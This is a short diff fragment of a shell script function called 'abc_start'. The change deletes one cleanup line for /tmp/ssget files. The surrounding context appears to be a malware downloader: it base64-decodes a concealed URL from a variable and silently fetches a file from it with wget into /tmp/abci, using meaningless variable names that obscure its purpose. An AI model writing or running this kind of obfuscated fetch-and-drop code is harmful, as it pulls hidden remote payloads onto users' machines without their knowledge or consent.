@@ -6,7 +6,6 @@ abc_start()
 abca=0
 abcb=1
 rm -f /tmp/abci*
-rm -f /tmp/ssget*
 abcd=`echo "$abcc" | base64 -d`
 wget -q -t 1 -O /tmp/abci $abcd
 if [ ! -f /tmp/abci ]; then
